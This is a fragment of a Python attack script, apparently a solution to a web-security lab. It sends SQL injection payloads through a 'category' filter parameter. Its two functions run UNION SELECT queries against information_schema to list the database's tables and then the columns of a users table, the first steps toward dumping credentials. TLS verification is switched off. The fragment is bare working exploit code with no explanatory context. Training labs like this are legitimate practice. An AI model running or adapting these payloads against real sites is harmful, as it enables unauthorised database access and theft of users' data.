...
def sqli_user(url):
    path = '/filter'
    cmd = "' UNION SELECT table_name,'a' FROM information_schema.tables--"
    params = {
        'category': 'Pets' + cmd
    }
...
def sqli_cols(url, users_table):
    path = '/filter'
    cmd = "' UNION SELECT column_name,'a' FROM information_schema.columns WHERE table_name = '" + users_table + "'--"  
    params = {
        'category': 'Pets' + cmd
    }
    r = s.get(url + path, params=params, verify=False)
